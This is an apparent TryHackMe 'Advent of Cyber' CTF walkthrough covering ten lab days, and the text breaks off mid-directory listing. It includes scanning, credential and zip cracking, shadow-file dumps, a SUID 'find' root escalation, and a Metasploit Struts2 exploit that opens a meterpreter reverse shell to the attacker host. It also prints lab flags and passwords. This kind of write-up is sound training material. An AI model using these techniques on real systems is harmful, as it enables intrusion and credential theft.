# Advent of Cyber


## Task 1 --  Introduction
No answer needed.


## Task 2 --  Connect To Our Network
No answer needed.


## Task 3 --  Points don't matter
No answer needed.




## Task 4 --  Our Socials
No answer needed.




## Task 5 -- [Optional] Your own Kali Linux Machine
No answer needed.




## Task 6 -- [Day 1] Inventory Management
```
export IP=10.10.90.106
```

Initial nmap scan:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/inventory_management$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 09:56 MDT
Nmap scan report for 10.10.90.106
Host is up (0.13s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 47:93:04:da:85:96:84:0d:89:b2:5f:01:1f:b0:51:84 (RSA)
|   256 07:1e:fc:66:d7:39:d7:7c:c6:26:89:f1:97:f7:8d:5c (ECDSA)
|_  256 c7:a0:23:df:1b:d7:1d:10:f7:32:b7:df:01:cb:c0:04 (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          48474/udp   status
|   100024  1          48715/tcp   status
|   100024  1          50001/tcp6  status
|_  100024  1          58960/udp6  status
3000/tcp open  http    Node.js Express framework
| http-title: Christmas Inventory List | Login
|_Requested resource was /login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Mon May 25 09:12:11 2020 -- 1 IP address (1 host up) scanned in 32.88 seconds
```

### 1 - What is the name of the cookie used for authentication?
```
authid
```

### 2 - If you decode the cookie, what is the value of the fixed part of the cookie?
```
v4er9ll1!ss
```

### 3 - After accessing his account, what did the user mcinventory request?
We can register a user with the same username of `mcinventory`, and the website does not validate if that user already exists or not based on the username. It seems to validate based on the email and not the username or both. Once we register a user with the same username, we can log in as that user and view the real `mcinventory`'s web page.
```
firewall
```



## Task 7 -- [Day 2] Arctic Forum
```
export IP=10.10.84.209
```

Initial nmap scan:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/arctic_forum$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 09:56 MDT
Nmap scan report for 10.10.84.209
Host is up (0.13s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 57:94:8d:1a:92:10:d3:21:dc:63:b2:77:a6:f4:12:16 (RSA)
|   256 ef:62:12:98:db:46:92:91:ef:05:9f:9a:7e:3b:4c:79 (ECDSA)
|_  256 10:d7:89:63:61:6a:61:af:41:12:74:fc:55:1f:92:6f (ED25519)
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36225/udp   status
|   100024  1          42815/tcp   status
|   100024  1          44805/udp6  status
|_  100024  1          56081/tcp6  status
3000/tcp open  http    Node.js Express framework
| http-title: Arctic Forum | Login
|_Requested resource was /login

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.84 seconds
```
### 1 - What is the path of the hidden page?
Initial gobuster scan:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/arctic_forum$ gobuster dir -u http://$IP:3000 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.84.209:3000
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/25 09:57:03 Starting gobuster
===============================================================
/admin (Status: 302)
/Admin (Status: 302)
/ADMIN (Status: 302)
/assets (Status: 301)
/css (Status: 301)
/home (Status: 302)
/Home (Status: 302)
/js (Status: 301)
/login (Status: 200)
/Login (Status: 200)
/logout (Status: 302)
/sysadmin (Status: 200)
/SysAdmin (Status: 200)
===============================================================
2020/05/25 09:58:16 Finished
===============================================================
```


### 2 - What is the password you found?
On the `/sysadmin` endpoint we see a comment in the HTML source:

```HTML
<!--
Admin portal created by arctic digital design - check out our github repo
-->
```

Looking at the github repo we see the following default credentials:
```
    username: admin
    password: defaultpass
```

### 3 - What do you have to take to the 'partay'
```
eggnog
```



## Task 8 -- [Day 3] Evil Elf
### 1 - Whats the destination IP on packet number 998?
```
63.32.89.195
```

### 2 - What item is on the Christmas list?
Looking through the packets most data seems to be going to or from 3389/tcp, however there is are two packets we see over 23/tcp where the Christmas list was transmitted using telnet:

```bash
echo 'ps4' > christmas_list.txt
cat /etc/shadow
root:*:18171:0:99999:7:::
daemon:*:18171:0:99999:7:::
bin:*:18171:0:99999:7:::
sys:*:18171:0:99999:7:::
sync:*:18171:0:99999:7:::
games:*:18171:0:99999:7:::
man:*:18171:0:99999:7:::
lp:*:18171:0:99999:7:::
mail:*:18171:0:99999:7:::
news:*:18171:0:99999:7:::
uucp:*:18171:0:99999:7:::
proxy:*:18171:0:99999:7:::
www-data:*:18171:0:99999:7:::
backup:*:18171:0:99999:7:::
list:*:18171:0:99999:7:::
irc:*:18171:0:99999:7:::
gnats:*:18171:0:99999:7:::
nobody:*:18171:0:99999:7:::
systemd-network:*:18171:0:99999:7:::
systemd-resolve:*:18171:0:99999:7:::
syslog:*:18171:0:99999:7:::
messagebus:*:18171:0:99999:7:::
_apt:*:18171:0:99999:7:::
lxd:*:18171:0:99999:7:::
uuidd:*:18171:0:99999:7:::
dnsmasq:*:18171:0:99999:7:::
landscape:*:18171:0:99999:7:::
sshd:*:18171:0:99999:7:::
pollinate:*:18171:0:99999:7:::
ubuntu:!:18232:0:99999:7:::
buddy:$6$3GvJsNPG$ZrSFprHS13divBhlaKg1rYrYLJ7m1xsYRKxlLh0A1sUc/6SUd7UvekBOtSnSyBwk3vCDqBhrgxQpkdsNN6aYP1:18233:0:99999:7:::
```

### 3 - Crack buddy's password!
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/evil_elf$ /opt/JohnTheRipper/run/john forjohn --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rainbow          (buddy)
1g 0:00:00:01 DONE (2020-05-25 10:12) 0.7633g/s 781.6p/s 781.6c/s 781.6C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```



## Task 9 -- [Day 4] Training
```
export IP=10.10.96.203
```
### 1 -How many visible files are there in the home directory(excluding ./ and ../)?
```bash
[mcsysadmin@ip-10-10-96-203 ~]$ ls -lh | wc -l
8
```

### 2 - What is the content of file5?
```bash
[mcsysadmin@ip-10-10-96-203 ~]$ cat file5
recipes
```

### 3 - Which file contains the string ‘password’?
```bash
[mcsysadmin@ip-10-10-96-203 ~]$ grep -r 'password' .
./file6:passwordHpKRQfdxzZocwg5O0RsiyLSVQon72CjFmsV4ZLGjxI8tXYo1NhLsEply
```

### 4 - What is the IP address in a file in the home folder?
```bash
[mcsysadmin@ip-10-10-96-203 ~]$ grep -Eo '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' file*
file2:10.0.0.05
```

### 5 - How many users can log into the machine?
```bash
[mcsysadmin@ip-10-10-96-203 ~]$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
libstoragemgmt:x:999:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
ec2-instance-connect:x:998:996::/home/ec2-instance-connect:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
chrony:x:997:995::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
ec2-user:x:1000:1000:EC2 Default User:/home/ec2-user:/bin/bash
mcsysadmin:x:1001:1001::/home/mcsysadmin:/bin/bash
```

### 6 - What is the sha1 hash of file8?
```bash
[mcsysadmin@ip-10-10-96-203 ~]$ sha1sum file8
fa67ee594358d83becdd2cb6c466b25320fd2835  file8
```

### 7 - What is mcsysadmin’s password hash?
```bash
[mcsysadmin@ip-10-10-96-203 ~]$ find / -name "*.bak" 2>/dev/null
/etc/nsswitch.conf.bak
/var/shadow.bak
[mcsysadmin@ip-10-10-96-203 ~]$ cat /var/shadow.bak
root:*LOCK*:14600::::::
bin:*:17919:0:99999:7:::
daemon:*:17919:0:99999:7:::
adm:*:17919:0:99999:7:::
lp:*:17919:0:99999:7:::
sync:*:17919:0:99999:7:::
shutdown:*:17919:0:99999:7:::
halt:*:17919:0:99999:7:::
mail:*:17919:0:99999:7:::
operator:*:17919:0:99999:7:::
games:*:17919:0:99999:7:::
ftp:*:17919:0:99999:7:::
nobody:*:17919:0:99999:7:::
systemd-network:!!:18218::::::
dbus:!!:18218::::::
rpc:!!:18218:0:99999:7:::
libstoragemgmt:!!:18218::::::
sshd:!!:18218::::::
rpcuser:!!:18218::::::
nfsnobody:!!:18218::::::
ec2-instance-connect:!!:18218::::::
postfix:!!:18218::::::
chrony:!!:18218::::::
tcpdump:!!:18218::::::
ec2-user:!!:18234:0:99999:7:::
mcsysadmin:$6$jbosYsU/$qOYToX/hnKGjT0EscuUIiIqF8GHgokHdy/Rg/DaB.RgkrbeBXPdzpHdMLI6cQJLdFlS4gkBMzilDBYcQvu2ro/:18234:0:99999:7:::
```



## Task 10 -- [Day 5] Ho-Ho-Hosint
### 1 - What is Lola's date of birth? Format: Month Date, Year(e.g November 12, 2019)
Using the username `JLolax1` that we found from exiftool:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/ho-ho-hosint$ exiftool thegrinch.jpg
ExifTool Version Number         : 11.99
File Name                       : thegrinch.jpg
Directory                       : .
File Size                       : 69 kB
File Modification Date/Time     : 2020:05:25 11:58:41-06:00
File Access Date/Time           : 2020:05:25 11:59:38-06:00
File Inode Change Date/Time     : 2020:05:25 11:59:28-06:00
File Permissions                : r--------
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
XMP Toolkit                     : Image::ExifTool 10.10
Creator                         : JLolax1
Image Width                     : 642
Image Height                    : 429
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 642x429
Megapixels                      : 0.275
```

```
December 29, 1900
```

### 2 - What is Lola's current occupation?
```
Santa's Helpers
```

### 3 - What phone does Lola make?
```
iPhone X
```

From Twitter:
```
Oooo!

Us Elves can now make iPhone's! Who'da thought it!

~ Sent from iPhone X
```

### 4 - What date did Lola first start her photography? Format: dd/mm/yyyy
```
23/10/2014
```

### 5 - What famous woman does Lola have on her web page?
```
Ada Lovelace
```




## Task 11 -- [Day 6] Data Elf-iltration
### 1 - What data was exfiltrated via DNS?
We see this hex data in the DNS queries:
```
43616e64792043616e652053657269616c204e756d6265722038343931
```

Which is hex encoded. Decoded the hex to ASCII gives us:

```
Candy Cane Serial Number 8491
```

### 2 - What did Little Timmy want to be for Christmas?
In the PCAP we can export all of the HTTP objects. One of the files is a password protected zip archive, which we can crack the passsword using JtR:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf-iltration$ /opt/JohnTheRipper/run/zip2john christmaslists.zip > forjohn
ver 1.0 efh 5455 efh 7875 christmaslists.zip/christmaslistdan.tx PKZIP Encr: 2b chk, TS_chk, cmplen=91, decmplen=79, crc=FF67349B
ver 2.0 efh 5455 efh 7875 christmaslists.zip/christmaslistdark.txt PKZIP Encr: 2b chk, TS_chk, cmplen=91, decmplen=82, crc=5A38B7BB
ver 2.0 efh 5455 efh 7875 christmaslists.zip/christmaslistskidyandashu.txt PKZIP Encr: 2b chk, TS_chk, cmplen=108, decmplen=116, crc=BCA00B27
ver 2.0 efh 5455 efh 7875 christmaslists.zip/christmaslisttimmy.txt PKZIP Encr: 2b chk, TS_chk, cmplen=105, decmplen=101, crc=7069EA51
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf-iltration$ /opt/JohnTheRipper/run/john forjohn --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
december         (christmaslists.zip)
1g 0:00:00:01 DONE (2020-05-25 12:41) 0.9259g/s 15170p/s 15170c/s 15170C/s 123456..cocoliso
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

```
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf-iltration$ cat christmaslisttimmy.txt
Dear Santa,
For Christmas I would like to be a PenTester! Not the Bic kind!
Thank you,
Little Timmy.
```

### 3 - What was hidden within the file?
We can use steghide to extract data from the JPG file:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf-iltration$ steghide extract -sf TryHackMe.jpg
Enter passphrase:
wrote extracted data to "christmasmonster.txt".
```

```
RFC527
```

```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/elf-iltration$ cat christmasmonster.txt
                              ARPAWOCKY
			       RFC527
                      .
                      .
                      .
                      .
 ```



## Task 12 -- [Day 7] Skilling Up
```
export IP=10.10.139.46
```
### 1 - how many TCP ports under 1000 are open?
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/skilling_up$ sudo nmap -O -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 12:57 MDT
WARNING: RST from 10.10.139.46 port 22 -- is this port really open?
Nmap scan report for 10.10.139.46
Host is up (0.14s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 df:5d:54:5e:bb:92:29:0c:2a:05:1b:fd:c9:06:22:f1 (RSA)
|   256 8e:88:b4:38:1a:b1:ef:cd:b2:3e:26:8f:d4:54:9c:c4 (ECDSA)
|_  256 2d:cb:1f:cf:43:42:1e:04:14:95:92:10:c7:98:55:6d (ED25519)
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          35145/tcp   status
|   100024  1          36179/tcp6  status
|   100024  1          39716/udp   status
|_  100024  1          46629/udp6  status
999/tcp open  http    SimpleHTTPServer 0.6 (Python 3.6.8)
|_http-server-header: SimpleHTTP/0.6 Python/3.6.8
|_http-title: Directory listing for /
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=5/25%OT=22%CT=1%CU=32214%PV=Y%DS=2%DC=I%G=Y%TM=5ECC152
OS:F%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=104%GCD=1%ISR=106%TI=Z%CI=Z%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%O
OS:3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=68DF%W2=
OS:68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=FF%W=6903%O=M508NNSN
OS:W6%CC=Y%Q=)T1(R=Y%DF=Y%T=FF%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=FF%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=FF%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=FF%CD=S)

Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.32 seconds
```

### 2 - What is the name of the OS of the host?
```
linux
```

### 3  - What version of SSH is running?
```
7.4
```

### 4 - What is the name of the file that is accessible on the server you found running?
http://$IP:999 has a file:

```
interesting.file
```



## Task 13 -- [Day 8] SUID Shenanigans
```
export IP=10.10.16.234
Username: holly
Password: tuD@4vt0G*TU
```
### 1 -- What port is SSH running on?
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/suid_shenanigans$ nmap -sC -sV -Pn -n -oN nmap/initial $IP -p-
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 13:01 MDT
Nmap scan report for 10.10.16.234
Host is up (0.14s latency).
Not shown: 65486 closed ports, 48 filtered ports
PORT      STATE SERVICE VERSION
65534/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 00:c7:a1:0e:3d:76:62:e5:d1:ed:e9:96:7d:c0:76:51 (RSA)
|   256 cd:70:f9:a1:2d:23:0c:bd:1b:88:27:b1:be:6d:87:04 (ECDSA)
|_  256 1a:7b:6d:ca:f2:dd:f7:4a:51:d7:2d:36:0f:80:69:4f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2703.32 seconds
```

### 2 - Find and run a file as igor. Read the file /home/igor/flag1.txt
Starting off we can search for files with the SUID bit set with the following command:
```#!/usr/bin/env bash
find / -perm -4000 2>/dev/null
```

In the output we see that `find` has the SUID bit set. Looking in [GTFOBins](https://gtfobins.github.io/gtfobins/find/), we can leverage this to get a shell as igor:

```#!/usr/bin/env bash
holly@ip-10-10-16-234:/home/igor$ /usr/bin/find . -exec /bin/sh -p \; -quit
$ id
uid=1001(holly) gid=1001(holly) euid=1002(igor) groups=1001(holly)
```

Notice that the effective user id (EUID) is now igor, so we are essentialy running as igor now.

```bash
$ cat flag1.txt
THM{d3f0708bdd9accda7f937d013eaf2cd8}
```

### 3 - Find another binary file that has the SUID bit set. Using this file, can you become the root user and read the /root/flag2.txt file?
From running the find command above we also notices that `system-control` had the SUID bit set. Running this command will let us run arbitrary commands as root:

```bash
holly@ip-10-10-16-234:/tmp$ ls -al /usr/bin/system-control
-rwsrwxr-x 1 root root 8880 Dec  7 21:17 /usr/bin/system-control
holly@ip-10-10-16-234:/tmp$ /usr/bin/system-control

===== System Control Binary =====

Enter system command: cat /root/flag2.txt
THM{8c8211826239d849fa8d6df03749c3a2}
```

### 4 If you've finished the challenge and want more practise, checkout the Privilege Escalation Playground room created by SherlockSec: https://tryhackme.com/room/privescplayground
No answer needed.




## Task 14 -- [Day 9] Requests
### 1 - What is the value of the flag?
For this we can write a simple python script that gathers the flag:
```python
#!/usr/bin/python3

import requests

c = ''
next = []
value = []
url = 'http://10.10.169.100:3000/'

while 1:
    r_json = requests.get(url + c).json()
    c = r_json['next']
    if c == 'end':
        break
    value.append(r_json['value'])

print('Flag is ' + ''.join(value))
```

Running the script we can get the flag:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/requests$ ./script.py
Flag is sCrIPtKiDd
```


## Task 15 -- [Day 10] Metasploit-a-ho-ho-ho
```
export IP=10.10.235.203
```
### 1 - Compromise the web server using Metasploit. What is flag1?
Initial nmap scan:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/metasploit-a-ho-ho-ho$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-25 14:16 MDT
Nmap scan report for 10.10.235.203
Host is up (0.13s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 39:f8:e5:33:8c:be:1e:c9:76:3d:f4:66:99:7b:2b:8b (RSA)
|   256 9f:16:20:94:7c:fe:a6:38:d7:5f:e4:de:f4:7e:c7:85 (ECDSA)
|_  256 19:60:cc:58:13:88:be:be:d7:de:06:58:98:d1:46:b1 (ED25519)
80/tcp  open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-server-header: Apache-Coyote/1.1
| http-title: Santa Naughty and Nice Tracker
|_Requested resource was showcase.action
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          38961/udp6  status
|   100024  1          42359/udp   status
|   100024  1          49009/tcp6  status
|_  100024  1          52919/tcp   status

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.82 seconds
```

We see the server is running Apache Tomcat/Coyote JSP engine 1.1, so we can use nikto to further enumerate what enpoints are available to us:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Advent of Cyber/metasploit-a-ho-ho-ho$ nikto -url http://$IP
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.235.203
+ Target Hostname:    10.10.235.203
+ Target Port:        80
+ Start Time:         2020-05-25 14:28:27 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: showcase.action
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Uncommon header 'nikto-added-cve-2017-5638' found, with contents: 42
+ /: Site appears vulnerable to the 'strutshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638).
+ /index.action: Site appears vulnerable to the 'strutshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638).
+ /login.action: Site appears vulnerable to the 'strutshock' vulnerability (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638).
```

Nikto found the `CVE-2017-5638` vulnerability that we can search by this CVE in metasploit and run the exploit accordingly:
```bash
msf5 > search CVE-2017-5638

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/multi/http/struts2_content_type_ognl  2017-03-07       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection


msf5 > use exploit/multi/http/struts2_content_type_ognl
msf5 exploit(multi/http/struts2_content_type_ognl) > show options

Module options (exploit/multi/http/struts2_content_type_ognl):

   Name       Current Setting     Required  Description
   ----       ---------------     --------  -----------
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8080                yes       The target port (TCP)
   SSL        false               no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /struts2-showcase/  yes       The path to a struts application action
   VHOST                          no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Universal


msf5 exploit(multi/http/struts2_content_type_ognl) > set rhosts 10.10.235.203
rhosts => 10.10.235.203
msf5 exploit(multi/http/struts2_content_type_ognl) > set rport 80
rport => 80
msf5 exploit(multi/http/struts2_content_type_ognl) > set targeturi /showcase.action
targeturi => /showcase.action
msf5 exploit(multi/http/struts2_content_type_ognl) > set lhost 10.8.21.42
lhost => 10.8.21.42
msf5 exploit(multi/http/struts2_content_type_ognl) > set payload linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/http/struts2_content_type_ognl) > exploit

[*] Started reverse TCP handler on 10.8.21.42:4444
[*] Sending stage (3012516 bytes) to 10.10.235.203
[*] Meterpreter session 1 opened (10.8.21.42:4444 -> 10.10.235.203:40122) at 2020-05-25 15:14:40 -0600

meterpreter > ls webapps
Listing: webapps
================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
40755/rwxr-xr-x   4096      dir   2019-12-08 14:12:45 -0700  ROOT
100644/rw-r--r--  12828110  fil   2019-10-23 13:16:52 -0600  ROOT.war

meterpreter > ls webapps/ROOT
Listing: webapps/ROOT
=====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  META-INF
100644/rw-r--r--  38    fil   2019-12-08 14:12:44 -0700  ThisIsFlag1.txt
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  WEB-INF
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  actionchaining
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  ajax
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  chat
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  conversion
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  customTemplateDir
100644/rw-r--r--  65    fil   2019-12-08 14:12:44 -0700  date.jsp
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  empmanager
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  filedownload
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  fileupload
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  freemarker
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  hangman
100644/rw-r--r--  997   fil   2019-12-08 14:12:44 -0700  help.jsp
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  images
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  img
100644/rw-r--r--  48    fil   2019-12-08 14:12:44 -0700  index.jsp
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  integration
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  interactive
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  js
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  jsf
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  modelDriven
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  person
100644/rw-r--r--  694   fil   2019-12-08 14:12:44 -0700  showcase.jsp
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  styles
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  tags
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  template
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  tiles
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  token
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  validation
100644/rw-r--r--  1399  fil   2019-12-08 14:12:44 -0700  viewSource.jsp
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  wait
40755/rwxr-xr-x   4096  dir   2019-12-08 14:12:45 -0700  xslt

meterpreter > cat webapps/ROOT/ThisIsFlag1.txt
THM{3ad96bb13ec963a5ca4cb99302b37e12}
```


### 2 - Now you've compromised the web server, get onto the main system. What is Santa's SSH password?
```bash
meterpreter > ls /home
Listing: /home
==============

Mode             Size  Type  Last modified              Name
----             ----  ----  -------------              ----
40755/rwxr-xr-x  4096  dir   2019-12-08 14:12:45 -0700  santa

meterpreter > cd /home/santa
meterpreter > ls
Listing: /home/santa
====================

